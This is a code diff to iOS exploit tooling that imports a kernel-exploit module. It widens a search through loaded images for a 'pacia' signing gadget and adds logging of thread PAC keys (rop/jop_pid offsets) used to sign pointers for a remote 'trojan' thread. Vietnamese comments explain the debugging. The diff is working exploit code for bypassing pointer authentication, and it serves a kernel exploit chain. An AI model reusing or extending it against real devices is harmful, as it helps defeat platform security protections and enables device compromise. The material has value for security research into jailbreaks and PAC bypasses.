@@ -10,12 +10,15 @@
 #import "Exception.h"
 #import "../kexploit/kexploit_opa334.h"
 #import "../kexploit/kutils.h"
+#import "../kexploit/offsets.h"
 
 #import <Foundation/Foundation.h>
 #import <dlfcn.h>
 #import <pthread.h>
 #import <mach/mach.h>
 #import <ptrauth.h>
+#import <mach-o/loader.h>
+#import <mach-o/dyld.h>
 
 extern bool gIsPACSupported;
 
@@ -60,24 +63,79 @@ uint64_t ptrauth_string_discriminator_special(const char *name)
 
 uint64_t find_pacia_gadget(void)
 {
-    const uint32_t paciaGadgetOpcodes[] = {
-        0xDAC10230,   // pacia x16, x17
-        0xAA1003E0,   // mov x0, x16
-        0xD65F03C0    // ret
+    // Task 18: bản cũ chỉ scan 0x1000 byte đầu của MỘT symbol Swift trong
+    // libswiftCore. Symbol/layout đổi theo iOS → gadget không tìm thấy →
+    // remote_pac trả 0 → sign_state đặt PC=0 → trojan fault ngay với x0 cũ
+    // (chính là shape "bootstrap getpid ret=0, pc-bad"). Giờ scan rộng dần,
+    // toàn bộ userspace (đọc __TEXT đã map của chính process — không đụng
+    // kernel):
+    //   1) symbol gốc + 0x1000 byte (hành vi cũ),
+    //   2) toàn bộ __TEXT của libswiftCore,
+    //   3) toàn bộ __TEXT của mọi image đang load (giới hạn 32MB/image).
+    static const uint8_t pat[12] = {
+        0x30, 0x02, 0xC1, 0xDA,   // pacia x16, x17
+        0xE0, 0x03, 0x10, 0xAA,   // mov  x0, x16
+        0xC0, 0x03, 0x5F, 0xD6    // ret
     };
-    void *sym = dlsym(RTLD_DEFAULT, "$sSwySWSnySiGciM");    //dsc's /usr/lib/swift/libswiftCore.dylib; Swift.UnsafeMutableRawBufferPointer.subscript.modify : (Swift.Range<Swift.Int>) -> Swift.UnsafeRawBufferPointer
-    if (!sym) {
-        printf("[%s:%d] $sSwySWSnySiGciM symbol not found\n", __FUNCTION__, __LINE__);
-        return 0;
-    }
-    uint64_t symAddr = native_strip((uint64_t)sym);
-    uint8_t *searchBase = (uint8_t *)(uintptr_t)symAddr;
-    for (size_t offset = 0; offset + sizeof(paciaGadgetOpcodes) <= 0x1000; offset += 4) {
-        if (memcmp(searchBase + offset, paciaGadgetOpcodes, sizeof(paciaGadgetOpcodes)) == 0) {
-            return symAddr + offset;
+
+    void *sym = dlsym(RTLD_DEFAULT, "$sSwySWSnySiGciM");
+    if (sym) {
+        uint8_t *searchBase = (uint8_t *)(uintptr_t)native_strip((uint64_t)sym);
+        for (size_t offset = 0; offset + sizeof(pat) <= 0x1000; offset += 4) {
+            if (memcmp(searchBase + offset, pat, sizeof(pat)) == 0) {
+                printf("[PAC] pacia gadget tại symbol gốc %#llx\n",
+                       (unsigned long long)native_strip((uint64_t)sym) + offset);
+                return native_strip((uint64_t)sym) + offset;
+            }
         }
+        printf("[PAC] 0x1000 byte đầu của $sSwySWSnySiGciM không có gadget — quét rộng hơn…\n");
+    } else {
+        printf("[PAC] $sSwySWSnySiGciM không tìm thấy — quét các image đang load…\n");
     }
-    printf("[%s:%d] pacia gadget not found\n", __FUNCTION__, __LINE__);
+
+    // Dò gadget trong vùng __TEXT của một image (trang đã map — đọc trực tiếp
+    // an toàn). Giới hạn 32MB/image để không paging cả shared cache.
+    static const uint64_t kMaxScanBytes = 32ULL * 1024 * 1024;
+    auto scanImage = ^(const struct mach_header *mh, const char *name) {
+        if (!mh || mh->magic != MH_MAGIC_64) return (uint64_t)0;
+        const uint8_t *cmd = (const uint8_t *)mh + sizeof(struct mach_header_64);
+        for (uint32_t c = 0; c < mh->ncmds; c++) {
+            const struct segment_command_64 *seg = (const struct segment_command_64 *)cmd;
+            if (seg->cmd == LC_SEGMENT_64 && strcmp(seg->segname, "__TEXT") == 0) {
+                uint64_t span = seg->filesize < kMaxScanBytes ? seg->filesize : kMaxScanBytes;
+                if (span >= sizeof(pat)) {
+                    const uint8_t *base = (const uint8_t *)mh;
+                    for (uint64_t off = 0; off + sizeof(pat) <= span; off += 4) {
+                        if (memcmp(base + off, pat, sizeof(pat)) == 0) {
+                            printf("[PAC] pacia gadget trong %s @ %#llx\n",
+                                   name ?: "?", (unsigned long long)(uintptr_t)(base + off));
+                            return (uint64_t)(uintptr_t)(base + off);
+                        }
+                    }
+                }
+                return (uint64_t)0;
+            }
+            cmd += seg->cmdsize;
+        }
+        return (uint64_t)0;
+    };
+
+    uint32_t imgCount = _dyld_image_count();
+    // Ưu tiên libswiftCore (nơi gadget từng sống ở mọi bản trước).
+    for (uint32_t i = 0; i < imgCount; i++) {
+        const char *imgName = _dyld_get_image_name(i);
+        if (!imgName || !strstr(imgName, "libswiftCore")) continue;
+        uint64_t hit = scanImage(_dyld_get_image_header(i), imgName);
+        if (hit) return hit;
+    }
+    // Rồi mọi image khác.
+    for (uint32_t i = 0; i < imgCount; i++) {
+        const char *imgName = _dyld_get_image_name(i);
+        uint64_t hit = scanImage(_dyld_get_image_header(i), imgName);
+        if (hit) return hit;
+    }
+
+    printf("[PAC] pacia gadget KHÔNG có trong image nào đã load — remote_pac sẽ thất bại (bootstrap sẽ fail shape pc-bad; gửi log để phân tích)\n");
     return 0;
 }
 
@@ -109,6 +167,16 @@ uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifi
     
     uint64_t keyA = thread_get_rop_pid(remoteThreadAddr);
     uint64_t keyB = thread_get_jop_pid(remoteThreadAddr);
+    // Log MỘT lần ngữ cảnh signing — đủ để chốt giả thuyết offset
+    // rop/jop_pid (0x158/0x160) mà không spam log mỗi lần sign.
+    static bool loggedCtxOnce = false;
+    if (!loggedCtxOnce) {
+        loggedCtxOnce = true;
+        printf("[PAC] remote_pac ctx: thread=%#llx gadget=%#llx keyA(rop@+%#x)=%#llx keyB(jop@+%#x)=%#llx\n",
+               remoteThreadAddr, g_RC_gadgetPacia,
+               off_thread_machine_rop_pid, keyA,
+               off_thread_machine_jop_pid, keyB);
+    }
     
     mach_port_t pacThread = MACH_PORT_NULL;
     kern_return_t kr = thread_create(mach_task_self_, &pacThread);
